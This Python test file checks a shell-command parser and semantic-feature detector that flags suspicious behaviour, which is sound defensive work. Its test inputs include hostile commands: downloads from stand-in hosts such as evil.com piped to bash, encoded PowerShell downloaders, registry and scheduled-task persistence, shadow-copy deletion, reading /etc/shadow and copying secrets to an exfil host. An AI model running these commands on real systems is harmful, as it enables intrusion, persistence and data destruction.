"""
validate_hybrid_foundation.py — comprehensive regression tests for parser.py + semantic_features.py

Run:  python3 validate_hybrid_foundation.py
"""

import json
import sys
from parser import parse_command
from semantic_features import build_semantic_features

PASS = "\033[32mPASS\033[0m"
FAIL = "\033[31mFAIL\033[0m"
WARN = "\033[33mWARN\033[0m"

# ─────────────────────────────────────────────────────────────────────────────
# TEST DEFINITIONS
# Each entry may include:
#   command          — the raw command string
#   expect_parser    — fields that MUST match in parse_command output
#   forbid_parser    — fields that MUST NOT contain these values
#   not_none_parser  — fields that must not be None
#   expect_semantic  — fields that MUST match in build_semantic_features output
#   forbid_semantic  — semantic fields that MUST be False
# ─────────────────────────────────────────────────────────────────────────────

TESTS = [
    # ═════════════════════════════════════════════════════════════════════════
    # 1. BENIGN SIMPLE COMMANDS
    # ═════════════════════════════════════════════════════════════════════════
    {
        "id": "benign_ls",
        "command": "ls",
        "expect_parser": {"executable": "ls", "platform": "linux", "flags": [], "urls": [], "ips": []},
        "forbid_semantic": ["downloads_remote_resource", "uses_encoded_payload",
                            "uses_obfuscation", "creates_scheduled_task",
                            "modifies_registry_autorun", "deletes_shadow_copies"],
    },
    {
        "id": "benign_pwd",
        "command": "pwd",
        "expect_parser": {"executable": "pwd", "platform": "linux"},
        "forbid_semantic": ["downloads_remote_resource", "writes_local_file",
                            "uses_encoded_payload"],
    },
    {
        "id": "benign_whoami",
        "command": "whoami",
        "expect_parser": {"executable": "whoami", "platform": "linux"},
        "expect_semantic": {"enumerates_identity": True},
        "forbid_semantic": ["downloads_remote_resource", "creates_scheduled_task"],
    },
    {
        "id": "benign_id",
        "command": "id",
        "expect_parser": {"executable": "id", "platform": "linux"},
        "expect_semantic": {"enumerates_identity": True},
    },
    {
        "id": "benign_hostname",
        "command": "hostname",
        "expect_parser": {"executable": "hostname"},
        "expect_semantic": {"enumerates_network_config": True},
        "forbid_semantic": ["downloads_remote_resource", "creates_scheduled_task"],
    },
    {
        "id": "benign_date",
        "command": "date",
        "expect_parser": {"executable": "date"},
        "forbid_semantic": ["downloads_remote_resource", "writes_local_file",
                            "uses_encoded_payload", "creates_scheduled_task"],
    },
    {
        "id": "benign_uname",
        "command": "uname -a",
        "expect_parser": {"executable": "uname", "platform": "linux", "flags": ["-a"]},
        "forbid_semantic": ["downloads_remote_resource"],
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 2. BENIGN ADMIN / DEV COMMANDS
    # ═════════════════════════════════════════════════════════════════════════
    {
        "id": "docker_exec",
        "command": "docker exec -it db bash",
        "expect_parser": {"executable": "docker", "subcommand": "exec", "platform": "linux"},
        "expect_semantic": {"runs_interpreter": True},
        "forbid_semantic": ["downloads_remote_resource", "creates_scheduled_task"],
    },
    {
        "id": "systemctl_status",
        "command": "systemctl status nginx",
        "expect_parser": {"executable": "systemctl", "subcommand": "status", "platform": "linux"},
        "expect_semantic": {"service_control": True, "creates_or_modifies_service": False},
    },
    {
        "id": "systemctl_restart",
        "command": "systemctl restart nginx",
        "expect_parser": {"executable": "systemctl", "subcommand": "restart", "platform": "linux"},
        "expect_semantic": {"service_control": True, "creates_or_modifies_service": False},
    },
    {
        "id": "systemctl_enable",
        "command": "systemctl enable nginx",
        "expect_parser": {"executable": "systemctl", "subcommand": "enable", "platform": "linux"},
        "expect_semantic": {"service_control": True, "creates_or_modifies_service": True},
    },
    {
        "id": "git_clone",
        "command": "git clone https://github.com/org/repo.git",
        "expect_parser": {
            "executable": "git", "subcommand": "clone",
            "urls": ["https://github.com/org/repo.git"],
            "domains": ["github.com"],
        },
        "forbid_semantic": ["creates_scheduled_task", "modifies_registry_autorun"],
    },
    {
        "id": "kubectl_get_pods",
        "command": "kubectl get pods -A",
        "expect_parser": {"executable": "kubectl", "subcommand": "get", "flags": ["-A"]},
        "forbid_semantic": ["downloads_remote_resource", "creates_scheduled_task"],
    },
    {
        "id": "scp_upload",
        "command": "scp file.txt user@remote:/home/user/",
        "expect_parser": {
            "executable": "scp", "platform": "linux",
            "file_paths": ["file.txt"],
        },
        "expect_semantic": {"transfers_file_to_remote": True},
    },
    {
        "id": "ssh_session",
        "command": "ssh user@192.168.1.10",
        "expect_parser": {
            "executable": "ssh", "platform": "linux",
            "remote_targets": ["user@192.168.1.10"],
            "ips": ["192.168.1.10"],
        },
        "expect_semantic": {"remote_execution_or_session": True},
    },
    {
        "id": "rsync_upload",
        "command": "rsync -avz ./build/ user@deploy-host:/var/www/",
        "expect_parser": {"executable": "rsync"},
        "expect_semantic": {"transfers_file_to_remote": True},
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 3. NETWORK / TRANSFER COMMANDS
    # ═════════════════════════════════════════════════════════════════════════
    {
        "id": "curl_simple",
        "command": "curl http://1.2.3.4/install.sh",
        "expect_parser": {
            "executable": "curl", "platform": "linux",
            "urls": ["http://1.2.3.4/install.sh"],
            "ips": ["1.2.3.4"],
        },
        "expect_semantic": {"downloads_remote_resource": True},
    },
    {
        "id": "curl_download_o",
        "command": "curl -o payload.exe http://1.2.3.4/payload.exe",
        "expect_parser": {
            "executable": "curl",
            "urls": ["http://1.2.3.4/payload.exe"],
            "ips": ["1.2.3.4"],
            "file_paths": ["payload.exe"],
            "flags": ["-o"],
        },
        "expect_semantic": {
            "downloads_remote_resource": True,
            "writes_local_file": True,
            "writes_executable_like_file": True,
        },
        "forbid_parser": {"domains": ["payload.exe"]},
    },
    {
        "id": "curl_pipe_bash",
        "command": "curl http://1.2.3.4/install.sh | bash",
        "expect_parser": {
            "executable": "curl", "has_pipe": True,
            "urls": ["http://1.2.3.4/install.sh"],
        },
        "expect_semantic": {"downloads_remote_resource": True, "runs_interpreter": True},
    },
    {
        "id": "wget_evil",
        "command": "wget http://evil.com:8080/drop.sh",
        "expect_parser": {
            "executable": "wget",
            "urls": ["http://evil.com:8080/drop.sh"],
            "domains": ["evil.com"],
            "ports": ["8080"],
        },
        "expect_semantic": {"downloads_remote_resource": True},
    },
    {
        "id": "certutil_download",
        "command": "certutil -urlcache -split -f http://bad.com/a.exe a.exe",
        "expect_parser": {
            "executable": "certutil", "platform": "windows",
            "lolbin_matches": ["certutil"],
            "urls": ["http://bad.com/a.exe"],
        },
        "expect_semantic": {
            "downloads_remote_resource": True,
            "uses_signed_proxy_binary": True,
        },
    },
    {
        "id": "wget_domain_only",
        "command": "wget http://malware.io/stage2.bin",
        "expect_parser": {
            "urls": ["http://malware.io/stage2.bin"],
            "domains": ["malware.io"],
        },
        "forbid_parser": {"domains": ["stage2.bin"]},
        "expect_semantic": {"downloads_remote_resource": True},
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 4. ARCHIVE / STAGING COMMANDS
    # ═════════════════════════════════════════════════════════════════════════
    {
        "id": "tar_create_gz",
        "command": "tar -czf backup.tar.gz /home/user/data",
        "expect_parser": {
            "executable": "tar",
            "archive_indicators": ["archive_tool", "archive_create", "compression_gzip", "archive_path", "backup_keyword"],
        },
        "expect_semantic": {"archive_create": True, "compression_or_archiving": True},
    },
    {
        "id": "tar_extract_gz",
        "command": "tar -xzf archive.tar.gz",
        "expect_parser": {
            "executable": "tar",
            "archive_indicators": ["archive_tool", "archive_extract", "compression_gzip", "archive_path"],
        },
        "expect_semantic": {"archive_extract": True, "compression_or_archiving": True},
    },
    {
        "id": "zip_create",
        "command": "zip -r backup.zip dir",
        "expect_parser": {"executable": "zip", "archive_indicators": ["archive_tool", "archive_create", "archive_path", "backup_keyword"]},
        "expect_semantic": {"archive_create": True, "compression_or_archiving": True},
    },
    {
        "id": "unzip_extract",
        "command": "unzip archive.zip -d /tmp/output",
        "expect_parser": {"executable": "unzip", "archive_indicators": ["archive_tool", "archive_extract", "archive_path"]},
        "expect_semantic": {"archive_extract": True, "compression_or_archiving": True},
    },
    {
        "id": "7z_create",
        "command": "7z a backup.7z logs/",
        "expect_parser": {"executable": "7z", "archive_indicators": ["archive_tool", "archive_create", "archive_path", "backup_keyword"]},
        "expect_semantic": {"archive_create": True, "compression_or_archiving": True},
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 5. WINDOWS PERSISTENCE / SUSPICIOUS COMMANDS
    # ═════════════════════════════════════════════════════════════════════════
    {
        "id": "reg_add_autorun",
        "command": r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\evil.exe /f",
        "expect_parser": {
            "executable": "reg", "platform": "windows", "subcommand": "add",
            "registry_paths": [r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"],
            "file_paths": [r"C:\Users\Public\evil.exe"],
        },
        "forbid_parser": {"file_paths": ["/v", "/t", "/d", "/f"]},
        "expect_semantic": {
            "modifies_registry_autorun": True,
            "uses_signed_proxy_binary": True,
        },
    },
    {
        "id": "schtasks_create",
        "command": r"schtasks /create /tn updater /tr evil.exe /sc onlogon",
        "expect_parser": {
            "executable": "schtasks", "platform": "windows",
        },
        "expect_semantic": {
            "creates_scheduled_task": True,
            "uses_signed_proxy_binary": True,
        },
    },
    {
        "id": "wmic_process_create",
        "command": 'wmic process call create "cmd.exe /c whoami"',
        "expect_parser": {
            "executable": "wmic", "platform": "windows", "subcommand": "process",
        },
        "expect_semantic": {
            "remote_execution_or_session": True,
            "uses_signed_proxy_binary": True,
        },
    },
    {
        "id": "vssadmin_delete_shadows",
        "command": "vssadmin delete shadows /all /quiet",
        "expect_parser": {
            "executable": "vssadmin", "platform": "windows", "subcommand": "delete",
        },
        "expect_semantic": {"deletes_shadow_copies": True},
    },
    {
        "id": "sc_create_service",
        "command": r"sc create updater binPath= C:\Users\Public\evil.exe",
        "expect_parser": {
            "executable": "sc", "platform": "windows", "subcommand": "create",
        },
        "expect_semantic": {
            "service_control": True,
            "creates_or_modifies_service": True,
        },
    },
    {
        "id": "reg_add_hklm_autorun",
        "command": r"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost /t REG_SZ /d C:\temp\svchost.exe /f",
        "expect_parser": {
            "executable": "reg", "subcommand": "add",
            "registry_paths": [r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run"],
        },
        "expect_semantic": {"modifies_registry_autorun": True},
    },
    {
        "id": "reg_add_non_autorun",
        "command": r"reg add HKCU\Software\SomeApp /v Setting /t REG_DWORD /d 1 /f",
        "expect_parser": {
            "executable": "reg", "subcommand": "add",
        },
        "expect_semantic": {"modifies_registry_autorun": False},
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 6. INTERPRETER / ENCODED / OBFUSCATED COMMANDS
    # ═════════════════════════════════════════════════════════════════════════
    {
        "id": "powershell_encoded_long",
        "command": "powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==",
        "expect_parser": {
            "executable": "powershell.exe", "platform": "windows",
            "inline_code": True,
            "encoded_markers": ["encoded_command_flag", "base64_blob"],
        },
        "expect_semantic": {
            "uses_encoded_payload": True,
            "executes_inline_code": True,
            "uses_signed_proxy_binary": True,
        },
    },
    {
        "id": "powershell_enc_short_flag",
        "command": "powershell -enc SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==",
        "expect_parser": {
            "executable": "powershell", "platform": "windows",
            "inline_code": True,
            "encoded_markers": ["encoded_command_flag", "base64_blob"],
        },
        "expect_semantic": {"uses_encoded_payload": True, "executes_inline_code": True},
    },
    {
        "id": "python3_inline",
        "command": "python3 -c \"print('hello world')\"",
        "expect_parser": {
            "executable": "python3", "platform": "linux",
            "flags": ["-c"],
            "inline_code": True,
            "interpreter_markers": ["python"],
        },
        "expect_semantic": {"executes_inline_code": True, "runs_interpreter": True},
        "forbid_semantic": ["downloads_remote_resource"],
    },
    {
        "id": "bash_inline_chain",
        "command": "bash -c 'id && uname -a'",
        "expect_parser": {
            "executable": "bash", "platform": "linux",
            "flags": ["-c"],
            "inline_code": True,
            "interpreter_markers": ["bash"],
        },
        "expect_semantic": {"executes_inline_code": True, "runs_interpreter": True},
    },
    {
        "id": "deobfuscate_encoded_command",
        "command": "powershell -EncodedCommand Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo",
        "expect_parser": {
            "urls": ["http://evil.com/shell.sh"],
            "domains": ["evil.com"],
            "has_pipe": True,
        },
        "not_none_parser": ["deobfuscated_command"],
        "expect_semantic": {"uses_encoded_payload": True},
    },
    {
        "id": "deobfuscate_char_cast",
        "command": "powershell -c \"[char]99+[char]109+[char]100\"",
        "expect_parser": {"executable": "powershell", "platform": "windows"},
        "not_none_parser": ["deobfuscated_command"],
        "expect_semantic": {"uses_obfuscation": True, "executes_inline_code": True},
    },
    {
        "id": "cmd_c_whoami",
        "command": "cmd /c whoami",
        "expect_parser": {
            "executable": "cmd", "platform": "windows",
            "inline_code": True,
            "interpreter_markers": ["cmd"],
        },
        "expect_semantic": {
            "executes_inline_code": True,
            "runs_interpreter": True,
            "uses_signed_proxy_binary": True,
        },
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 7. OPERATOR / CHAINING EDGE CASES
    # ═════════════════════════════════════════════════════════════════════════
    {
        "id": "pipe_basic",
        "command": "cat /etc/passwd | grep root",
        "expect_parser": {
            "has_pipe": True, "pipe_operators": ["|"],
            "executable": "cat",
        },
    },
    {
        "id": "redirect_stdout",
        "command": "echo hello > output.txt",
        "expect_parser": {"has_redirect": True, "redirect_operators": [">"]},
    },
    {
        "id": "redirect_append",
        "command": "echo world >> output.txt",
        "expect_parser": {"has_redirect": True, "redirect_operators": [">>"]},
    },
    {
        "id": "redirect_stderr",
        "command": "cmd 2> errors.log",
        "expect_parser": {"has_redirect": True, "redirect_operators": ["2>"]},
    },
    {
        "id": "chain_and",
        "command": "mkdir /tmp/work && cd /tmp/work",
        "expect_parser": {"has_chain": True, "chain_operators": ["&&"]},
    },
    {
        "id": "chain_or",
        "command": "test -f /tmp/lock || echo missing",
        "expect_parser": {"has_chain": True, "chain_operators": ["||"]},
    },
    {
        "id": "chain_semicolon",
        "command": "echo a; echo b",
        "expect_parser": {"has_chain": True, "chain_operators": [";"]},
    },
    {
        "id": "complex_pipe_redirect",
        "command": "find /var/log -type f | xargs grep -i error > errors.txt",
        "expect_parser": {
            "executable": "find",
            "has_pipe": True,
            "has_redirect": True,
            "pipe_operators": ["|"],
            "redirect_operators": [">"],
        },
    },
    {
        "id": "multi_pipe",
        "command": "ps aux | grep java | awk '{print $2}'",
        "expect_parser": {
            "has_pipe": True,
        },
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 8. FALSE-POSITIVE SUPPRESSION EDGE CASES
    # ═════════════════════════════════════════════════════════════════════════
    {
        "id": "fp_no_domain_from_filename",
        "command": "curl -o payload.exe http://1.2.3.4/payload.exe",
        "forbid_parser": {"domains": ["payload.exe"]},
    },
    {
        "id": "fp_no_domain_from_tar_gz",
        "command": "tar -xzf backup.tar.gz",
        "forbid_parser": {"domains": ["backup.tar.gz", "backup.tar"]},
    },
    {
        "id": "fp_no_flags_as_filepaths_windows",
        "command": r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\evil.exe /f",
        "forbid_parser": {"file_paths": ["/v", "/t", "/d", "/f"]},
    },
    {
        "id": "fp_scp_remote_target",
        "command": "scp file.txt user@remote:/home/user/",
        "expect_parser": {"remote_targets": ["user@remote:/home/user/"]},
    },
    {
        "id": "fp_ssh_remote_target",
        "command": "ssh admin@10.0.0.5",
        "expect_parser": {
            "remote_targets": ["admin@10.0.0.5"],
            "ips": ["10.0.0.5"],
        },
    },
    {
        "id": "fp_windows_path_backslash",
        "command": r"copy C:\Users\Public\evil.exe C:\Windows\Temp\evil.exe",
        "expect_parser": {
            "file_paths": [r"C:\Users\Public\evil.exe", r"C:\Windows\Temp\evil.exe"],
        },
    },
    {
        "id": "fp_url_path_not_domain",
        "command": "wget http://evil.com/path/to/file.bin",
        "expect_parser": {"domains": ["evil.com"]},
        "forbid_parser": {"domains": ["file.bin", "to", "path"]},
    },
    {
        "id": "fp_no_domain_from_drop_sh",
        "command": "wget http://evil.com:8080/drop.sh",
        "forbid_parser": {"domains": ["drop.sh"]},
    },
    {
        "id": "fp_unc_path_as_remote",
        "command": "copy \\\\fileserver\\share\\payload.exe C:\\temp\\",
        "expect_parser": {
            "remote_targets": ["\\\\fileserver\\share\\payload.exe"],
        },
    },
    {
        "id": "fp_no_false_ip_from_version",
        "command": "python3 --version",
        "forbid_parser": {"ips": ["3.0.0.0"]},  # don't parse version numbers as IPs
    },
    {
        "id": "fp_no_dotnet_class_as_domain",
        "command": "powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==",
        "expect_parser": {"domains": ["bad.com"]},
        "forbid_parser": {"domains": ["net.webclient", "net.webrequest", "system.io"]},
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 9. SEMANTIC FEATURE DEEP CHECKS
    # ═════════════════════════════════════════════════════════════════════════

    # -- downloads_remote_resource --
    {
        "id": "sem_curl_downloads",
        "command": "curl http://example.com/malware.bin",
        "expect_semantic": {"downloads_remote_resource": True},
    },
    {
        "id": "sem_wget_downloads",
        "command": "wget http://10.0.0.1:4444/stager.sh",
        "expect_semantic": {"downloads_remote_resource": True},
    },
    {
        "id": "sem_bitsadmin_downloads",
        "command": "bitsadmin /transfer job http://evil.com/a.exe C:\\a.exe",
        "expect_semantic": {"downloads_remote_resource": True, "uses_signed_proxy_binary": True},
    },

    # -- transfers_file_to_remote --
    {
        "id": "sem_scp_transfers",
        "command": "scp secrets.tar.gz user@exfil-host:/tmp/",
        "expect_semantic": {"transfers_file_to_remote": True},
    },

    # -- writes_executable_like_file --
    {
        "id": "sem_writes_exe",
        "command": "curl -o stage2.exe http://1.2.3.4/stage2.exe",
        "expect_semantic": {"writes_executable_like_file": True, "writes_local_file": True},
    },
    {
        "id": "sem_writes_dll",
        "command": "curl -o implant.dll http://1.2.3.4/implant.dll",
        "expect_semantic": {"writes_executable_like_file": True},
    },
    {
        "id": "sem_writes_sh",
        "command": "curl -o loader.sh http://1.2.3.4/loader.sh",
        "expect_semantic": {"writes_executable_like_file": True},
    },

    # -- archive_create / archive_extract --
    {
        "id": "sem_tar_create",
        "command": "tar -czf exfil.tar.gz /etc/",
        "expect_semantic": {"archive_create": True, "compression_or_archiving": True},
    },
    {
        "id": "sem_tar_extract",
        "command": "tar -xf payload.tar",
        "expect_semantic": {"archive_extract": True, "archive_create": False},
    },

    # -- creates_scheduled_task --
    {
        "id": "sem_schtasks_onlogon",
        "command": r"schtasks /create /tn updater /tr evil.exe /sc onlogon",
        "expect_semantic": {"creates_scheduled_task": True},
    },
    {
        "id": "sem_schtasks_query_no_create",
        "command": "schtasks /query /tn updater",
        "expect_semantic": {"creates_scheduled_task": False},
    },

    # -- modifies_registry_autorun --
    {
        "id": "sem_reg_autorun_hkcu_run",
        "command": r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /d evil.exe /f",
        "expect_semantic": {"modifies_registry_autorun": True},
    },
    {
        "id": "sem_reg_autorun_hklm_runonce",
        "command": r"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Evil /d evil.exe /f",
        "expect_semantic": {"modifies_registry_autorun": True},
    },
    {
        "id": "sem_reg_no_autorun",
        "command": r"reg add HKCU\Software\SomeApp /v Val /d foo /f",
        "expect_semantic": {"modifies_registry_autorun": False},
    },

    # -- uses_encoded_payload / uses_obfuscation --
    {
        "id": "sem_encoded_ps",
        "command": "powershell -enc SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==",
        "expect_semantic": {"uses_encoded_payload": True, "uses_obfuscation": True},
    },
    {
        "id": "sem_no_encoded_plain_ps",
        "command": "powershell -c Get-Process",
        "expect_semantic": {"uses_encoded_payload": False},
    },

    # -- executes_inline_code / runs_interpreter --
    {
        "id": "sem_bash_c_inline",
        "command": "bash -c 'whoami'",
        "expect_semantic": {"executes_inline_code": True, "runs_interpreter": True},
    },
    {
        "id": "sem_python_c_inline",
        "command": "python3 -c 'import os; os.system(\"id\")'",
        "expect_semantic": {"executes_inline_code": True, "runs_interpreter": True},
    },
    {
        "id": "sem_perl_e_inline",
        "command": "perl -e 'print \"hello\\n\"'",
        "expect_semantic": {"executes_inline_code": True, "runs_interpreter": True},
    },

    # -- uses_signed_proxy_binary --
    {
        "id": "sem_mshta_proxy",
        "command": "mshta http://evil.com/payload.hta",
        "expect_semantic": {"uses_signed_proxy_binary": True},
    },
    {
        "id": "sem_rundll32_proxy",
        "command": r"rundll32 C:\evil.dll,EntryPoint",
        "expect_semantic": {"uses_signed_proxy_binary": True},
    },

    # -- remote_execution_or_session --
    {
        "id": "sem_ssh_remote_exec",
        "command": "ssh user@192.168.1.10",
        "expect_semantic": {"remote_execution_or_session": True},
    },
    {
        "id": "sem_wmic_process",
        "command": 'wmic process call create "cmd.exe /c whoami"',
        "expect_semantic": {"remote_execution_or_session": True},
    },

    # -- service_control / creates_or_modifies_service --
    {
        "id": "sem_sc_create",
        "command": r"sc create updater binPath= C:\evil.exe",
        "expect_semantic": {"service_control": True, "creates_or_modifies_service": True},
    },
    {
        "id": "sem_sc_query_no_create",
        "command": "sc query updater",
        "expect_semantic": {"service_control": True, "creates_or_modifies_service": False},
    },
    {
        "id": "sem_systemctl_enable",
        "command": "systemctl enable evil.service",
        "expect_semantic": {"service_control": True, "creates_or_modifies_service": True},
    },

    # -- deletes_shadow_copies --
    {
        "id": "sem_vssadmin_delete",
        "command": "vssadmin delete shadows /all /quiet",
        "expect_semantic": {"deletes_shadow_copies": True},
    },
    {
        "id": "sem_vssadmin_list_no_delete",
        "command": "vssadmin list shadows",
        "expect_semantic": {"deletes_shadow_copies": False},
    },

    # -- reads_credential_store --
    {
        "id": "sem_cat_shadow",
        "command": "cat /etc/shadow",
        "expect_semantic": {"reads_credential_store": True},
    },
    {
        "id": "sem_cat_passwd",
        "command": "cat /etc/passwd",
        "expect_semantic": {"reads_credential_store": True},
    },

    # -- enumerates_identity --
    {
        "id": "sem_whoami_enum",
        "command": "whoami",
        "expect_semantic": {"enumerates_identity": True},
    },
    {
        "id": "sem_id_enum",
        "command": "id",
        "expect_semantic": {"enumerates_identity": True},
    },

    # -- enumerates_network_config --
    {
        "id": "sem_ifconfig",
        "command": "ifconfig",
        "expect_semantic": {"enumerates_network_config": True},
    },
    {
        "id": "sem_ipconfig",
        "command": "ipconfig /all",
        "expect_semantic": {"enumerates_network_config": True},
    },
    {
        "id": "sem_netstat",
        "command": "netstat -tlnp",
        "expect_semantic": {"enumerates_network_config": True},
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 10. MALFORMED / WEIRD / ADVERSARIAL EDGE CASES
    # ═════════════════════════════════════════════════════════════════════════
    {
        "id": "empty_string",
        "command": "",
        "expect_parser": {"executable": "", "urls": [], "ips": []},
    },
    {
        "id": "whitespace_only",
        "command": "    ",
        "expect_parser": {"executable": "", "urls": [], "ips": []},
    },
    {
        "id": "single_word_unknown",
        "command": "foobar",
        "expect_parser": {"executable": "foobar", "platform": "unknown"},
    },
    {
        "id": "excessive_spaces",
        "command": "curl   -o    test.txt   http://1.2.3.4/test.txt",
        "expect_parser": {
            "executable": "curl",
            "urls": ["http://1.2.3.4/test.txt"],
        },
    },
    {
        "id": "url_with_credentials",
        "command": "curl http://admin:password@evil.com/payload",
        "expect_parser": {
            "urls": ["http://admin:password@evil.com/payload"],
            "domains": ["evil.com"],
        },
    },
    {
        "id": "multiple_ips",
        "command": "ping 10.0.0.1 && ping 10.0.0.2",
        "expect_parser": {
            "ips": ["10.0.0.1", "10.0.0.2"],
            "has_chain": True,
        },
    },
    {
        "id": "long_flag_chain",
        "command": "ls -la --color=auto --human-readable",
        "expect_parser": {
            "executable": "ls",
            "flags": ["-la", "--color=auto", "--human-readable"],
        },
    },
    {
        "id": "quoted_argument",
        "command": 'grep -r "password" /etc/',
        "expect_parser": {
            "executable": "grep",
            "flags": ["-r"],
        },
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# TEST RUNNER
# ─────────────────────────────────────────────────────────────────────────────

def _check_field(result: dict, field: str, expected_value) -> tuple[bool, str]:
    actual = result.get(field)
    if isinstance(expected_value, list):
        if not isinstance(actual, list):
            return False, f"  {field}: expected list {expected_value}, got {actual!r}"
        missing = [v for v in expected_value if v not in actual]
        if missing:
            return False, f"  {field}: missing {missing} (got {actual})"
    elif isinstance(expected_value, bool):
        if actual != expected_value:
            return False, f"  {field}: expected {expected_value}, got {actual}"
    elif isinstance(expected_value, str):
        if actual != expected_value:
            return False, f"  {field}: expected {expected_value!r}, got {actual!r}"
    elif actual != expected_value:
        return False, f"  {field}: expected {expected_value!r}, got {actual!r}"
    return True, ""


def _check_forbid(result: dict, field: str, forbidden_values) -> tuple[bool, str]:
    actual = result.get(field, [])
    if isinstance(forbidden_values, list):
        found = [v for v in forbidden_values if v in actual]
        if found:
            return False, f"  {field}: forbidden values present {found} (got {actual})"
    return True, ""


def run_tests() -> int:
    failures = 0
    category = None

    for test in TESTS:
        tid = test["id"]
        command = test["command"]

        # Parse
        parsed = parse_command(command)
        feats = build_semantic_features(parsed)

        errors = []

        # ── parser expectations ──
        for field, expected_value in test.get("expect_parser", {}).items():
            ok, msg = _check_field(parsed, field, expected_value)
            if not ok:
                errors.append(f"  [parser] {msg.strip()}")

        for field, forbidden_values in test.get("forbid_parser", {}).items():
            ok, msg = _check_forbid(parsed, field, forbidden_values)
            if not ok:
                errors.append(f"  [parser] {msg.strip()}")

        for field in test.get("not_none_parser", []):
            if parsed.get(field) is None:
                errors.append(f"  [parser] {field}: expected non-None, got None")

        # ── semantic expectations ──
        for field, expected_value in test.get("expect_semantic", {}).items():
            ok, msg = _check_field(feats, field, expected_value)
            if not ok:
                errors.append(f"  [semantic] {msg.strip()}")

        for field in test.get("forbid_semantic", []):
            if feats.get(field) is True:
                errors.append(f"  [semantic] {field}: expected False, got True")

        # ── print result ──
        if errors:
            print(f"{FAIL}  [{tid}]  {command!r}")
            for e in errors:
                print(e)
            failures += 1
        else:
            print(f"{PASS}  [{tid}]")

    print()
    total = len(TESTS)
    passed = total - failures
    print(f"Results: {passed}/{total} passed")
    if failures:
        print(f"{FAIL}  {failures} failure(s)")
    else:
        print(f"{PASS}  All tests passed!")
    return failures


if __name__ == "__main__":
    sys.exit(run_tests())
